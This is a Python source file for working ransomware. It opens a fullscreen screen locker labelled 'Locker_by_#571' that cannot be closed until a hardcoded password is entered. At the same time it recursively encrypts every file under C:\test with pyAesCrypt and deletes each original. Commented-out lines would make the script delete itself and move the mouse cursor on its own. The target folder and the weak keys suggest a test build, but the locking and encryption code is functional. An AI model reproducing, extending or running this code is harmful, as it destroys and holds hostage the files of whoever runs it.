import os
import sys
import pyAesCrypt
from threading import Thread
from pyautogui import click, moveTo, FailSafeException
from tkinter import Tk, Entry, Label
from time import sleep

direct = r"C:\test"
crypt_pass = '12345'
locker_pass = "qwerty"

def locker():
    global k, entry

    def callback(event):
        global k
        if entry.get() == locker_pass:
            k = True

    def block():
        try:
            pass
            # click(675, 420)  # Кликать на координаты 675 420
            # moveTo(675, 420)  # Перемещать курсор на координаты 675 420
        except FailSafeException:
            pass

        root.attributes("-fullscreen", True)
        root.protocol("WM_DELETE_WINDOW", block)
        root.update()
        root.bind('<Control-KeyPress-c>', callback)

    root = Tk()
    root.title("Locker")
    root.attributes("-fullscreen", True)
    entry = Entry(root, font=1)
    label0 = Label(root, text="Locker_by_#571", font=1)
    label0.grid(row=0, column=0)
    label1 = Label(root, text="Write the Password and Press Ctrl+C", font='Arial 20')
    label1.place(x=470, y=300)
    entry.place(width=150, height=50, x=600, y=400)
    root.update()
    sleep(0.2)
    # click(675, 420)
    k = False
    while not k:
        block()

def crypter():
    def crypt(file):
        password = crypt_pass
        bufferSize = 512 * 1024
        pyAesCrypt.encryptFile(str(file), str(file) + ".crp", password, bufferSize)
        os.remove(file)

    def walk(dir):
        for name in os.listdir(dir):
            path = os.path.join(dir, name)
            if os.path.isfile(path):
                crypt(path)
            else:
                walk(path)

    walk(direct)
    print("Encryption complete.")
    # os.remove(sys.argv[0])

thread_1 = Thread(target=locker)
thread_2 = Thread(target=crypter)

thread_1.start()
thread_2.start()

thread_1.join()
thread_2.join()
